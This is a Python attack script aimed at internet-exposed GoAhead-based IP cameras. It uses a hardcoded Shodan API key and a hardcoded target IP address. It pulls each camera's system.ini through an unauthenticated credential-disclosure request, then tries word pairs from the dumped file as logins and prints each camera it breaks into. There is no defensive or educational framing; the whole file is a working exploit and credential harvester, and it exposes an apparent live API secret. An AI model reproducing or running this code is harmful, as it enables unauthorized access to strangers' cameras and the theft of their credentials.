import shodan, os, urllib.request
from requests import get
from requests import session
from colorama import init, Fore, Back
from progress.bar import IncrementalBar

try:
 mess = urllib.request.urlopen('https://raw.githubusercontent.com/Max412/cam/main/user.txt').read().decode('utf8')
except urllib.error.URLError:
 input("Check your internet connection!")
 exit()
except:
 input("Something went wrong!")
 exit()

# if os.getlogin() in mess:
#   pass
# else:
#   print("This user is not registered.\n")
#   input("Press Enter to exit.")
#   exit()

init(autoreset=True)

# if os.path.exists(r'C:\Windows\Temp\te.config') == False:
#  inn = input("Введите ключ API: ")
#  if inn == '':
#   exit()
#  file = open(r'C:\Windows\Temp\te.config', 'w')
#  file.write(inn)
#  file.close()
# else:
#   #print('ok')
#   pass

# key = open(r'C:\Windows\Temp\te.config', 'r').read()
key = '9r6vVczYqYGR9F3WADASttMPt6fqK2Mm' #9r6vVczYqYGR9F3WADASttMPt6fqK2Mm

api = shodan.Shodan(key)

num_of_vulnerable = ['187.39.115.243']
locations = []
ips = ['187.39.115.243']

def st():

 # try:
 #  results = api.search('realm="GoAhead", domain=":81"')
 # except shodan.exception.APIError:
 #  #os.remove(r'C:\Windows\Temp\te.config')
 #  input('Неправильный ключ API!\nПерезапустите программу и введите корректный API.')
 #  exit()
 
 # #ips.clear()
 # for result in results['matches']:
 #  ips.append(format(result['ip_str']))
 #  # with open('assad.txt', 'a+') as e:
 #  #   e.write(format(result['ip_str'])+'\n')
 #  ka = result['location']
 #  locations.append(f"{format(ka['city'])}, {format(ka['country_name'])}")

 for ip in ips:
  try:

   print(f"Trying {Fore.CYAN + ip}")
   r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10) 

   with open(f'camera_{ip}.ini', 'wb') as f:
    f.write(r.content)

   if os.stat(f'camera_{ip}.ini').st_size >= int('10000') or os.stat(f'camera_{ip}.ini').st_size == int('178') or os.stat(f'camera_{ip}.ini').st_size == int('171') or os.stat(f'camera_{ip}.ini').st_size == int('542') or os.stat(f'camera_{ip}.ini').st_size == int('188'):
    os.remove(f'camera_{ip}.ini')
    #ips.remove(ip)
    #print(ips)
    print(Fore.LIGHTRED_EX + 'Denied\n')
    #input()
   else:
    num_of_vulnerable.append(ip)
    print(Fore.LIGHTGREEN_EX + 'Accessed\n')
  except Exception as e:
    print(f'{ip} not available.\n{e}')
    continue
st()

print('')

s = session()


raz = 0
with IncrementalBar('Processing', max=len(num_of_vulnerable)) as bar:
 #username = None
 #password = None
 #print(f'Username: {username}, password: {password}')
 for ipi in num_of_vulnerable:
   try:
    user = None
    password = None
    file = open(f'camera_{ipi}.ini', 'r')

    try:
     data = file.read().replace('\x00', ' ')
     words = data.split()
    except Exception as r:
     print(r)
     input('line 188')
    for i in range(len(words)-1):
     try:
      page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
      #print(f"Trying for {ipi}\nUsername: {words[i]}, pass: {words[i+1]}", end='')
      #username = words[i]
      #password = words[i+1]
      if page.status_code == 200:
       #user = words[i]
       #password = words[i+1]
       print(f'\nSuccess: {ipi}, {words[i]}:{words[i+1]}')
       raz += 1
       bar.next()
       break
      #raz += 1
      #tree.insert('', tk.END, values=(ipi, user, password))
     except Exception as e:
      #print('Error: ', e)
      continue
   except:
    continue
input()

#gCe3xVjxN3
